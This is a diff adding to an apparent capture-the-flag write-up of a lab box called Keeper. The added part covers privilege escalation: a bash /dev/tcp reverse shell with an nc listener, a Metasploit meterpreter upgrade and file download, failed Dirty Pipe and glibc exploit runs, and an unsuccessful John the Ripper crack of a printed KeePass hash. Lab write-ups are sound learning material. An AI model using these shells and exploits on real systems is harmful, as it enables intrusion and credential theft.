@@ -23,6 +23,7 @@ but it seems to be a mobile version
 RT/4.4.4+dfsg-2ubuntu1 is the RT version
 
 Directory enumeration finds:
+/l
 /rt
 /rte
 /rtl
@@ -90,4 +91,95 @@ Upon reaching that part of the guide, I noticed they were able to login to this 
 I double checked the credentials and I realized I was typing in Welcome123! and not Welcome2023! #UserError
 
 Now we have a successful ssh as lnorgaard and the user flag. Time to privilege escalate.
+First think I noticed was a zipped file, so I extracted it:
+lnorgaard@keeper:~$ ls
+KeePassDumpFull.dmp  RT30000.zip  user.txt
+
+Then I ran sudo -l to see if I had sudo permissions to privilege escalate a reverse shell but I 
+didn't have sudo privileges on anything. I did notice I had write/execute access to a lot of places.
+
+I immediately setup a simple reverse shell:
+sh -i >& /dev/tcp/10.10.14.238/4444 0>&1
+nc -lvnp 4444
+
+The shell executed with no friction.
+
+I re-launched a shell using metasploit's exploit/multi/handler.
+
+Upgraded the session with -u to meterpreter
+msf6 exploit(multi/handler) > sessions -u 1
+[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]
+[*] Upgrading session ID: 1
+
+
+Used this new session to download the .zip file on Lisa's desktop:
+meterpreter > download RT30000.zip
+[*] Downloading: RT30000.zip -> /home/cesar/RT30000.zip
+
+
+Unzipped the file.
+Had to install keepass to view .kdbx files.
+
+Launching keepass and importing the db resulted in a password being requested.
+
+Went back to analyze the KeePassDumpFull.dmp file which is a memory snapshot of
+keepass:
+strings KeePassDumpFull.dmp
+
+strings KeePassDumpFull.dmp | grep -i 'password'
+
+The more I analyzed the file the more it just looked like a giant dump of everything that the website recorded me trying.
+I decided to pivot.
+
+Ran the local exploit suggester on the meterpreter session to check for vulnerabilities:
+post/multi/recon/local_exploit_suggester
+ #   Name                                                               Potentially Vulnerable?  Check Result
+ -   ----                                                               -----------------------  ------------
+ 1   exploit/linux/local/cve_2022_0847_dirtypipe                        Yes                      The target appears to be vulnerable. Linux kernel version found: 5.15.0
+ 2   exploit/linux/local/glibc_tunables_priv_esc                        Yes                      The target appears to be vulnerable. The glibc version (2.35-0ubuntu3.1) found on the target appears to be vulnerable
+ 3   exploit/linux/local/su_login                                       Yes                      The target appears to be vulnerable.
+
+results:
+msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > run
+[*] Started reverse TCP handler on 10.10.14.238:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable. Linux kernel version found: 5.15.0
+[*] Writing '/tmp/.qycitdwnycmk' (35592 bytes) ...
+[*] Executing exploit '/tmp/.qycitdwnycmk /bin/passwd'
+[*] Exploit completed, but no session was created.
+
+No sucess. Trying the next exploit:
+
+msf6 exploit(linux/local/glibc_tunables_priv_esc) > run
+[*] Started reverse TCP handler on 10.10.14.238:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable. The glibc version (2.35-0ubuntu3.1) found on the target appears to be vulnerable
+[+] The Build ID for ld.so: 61ef896a699bb1c2e4e231642b2e1688b2f1a61e is in the list of supported Build IDs for the exploit.
+Traceback (most recent call last):
+  File "<stdin>", line 290, in <module>
+PermissionError: [Errno 13] Permission denied: b'"'
+
+Another bust. Last module was another failure. No sessions created for any.
+
+I extracted the password hash from the database using john the ripper:
+┌──(cesar㉿kali)-[~]
+└─$ cat keepass_hash.txt
+passcodes:$keepass$*2*60000*0*5d7b4747e5a278d572fb0a66fe187ae5d74a0e2f56a2aaaf4c4f2b8ca342597d*5b7ec1cf6889266a388abe398d7990a294bf2a581156f7a7452b4074479bdea7*08500fa5a52622ab89b0addfedd5a05c*411593ef0846fc1bb3db4f9bab515b42e58ade0c25096d15f090b0fe10161125*a4842b416f14723513c5fb704a2f49024a70818e786f07e68e82a6d3d7cdbcdc
+
+tried to crack it:
+
+┌──(cesar㉿kali)-[~]
+└─$ john --wordlist=/usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000000.txt keepass_hash.txt
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (KeePass [SHA256 AES 32/64])
+Cost 1 (iteration count) is 60000 for all loaded hashes
+Cost 2 (version) is 2 for all loaded hashes
+Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
+Will run 16 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:31 2.21% (ETA: 06:25:20) 0g/s 768.3p/s 768.3c/s 768.3C/s 280384..231191
+0g 0:00:01:07 4.73% (ETA: 06:25:34) 0g/s 769.4p/s 769.4c/s 769.4C/s 030278..01111961
+0g 0:00:21:38 DONE (2025-03-16 06:23) 0g/s 770.2p/s 770.2c/s 770.2C/s vabatsh3..vaanes
+Session completed. 
 
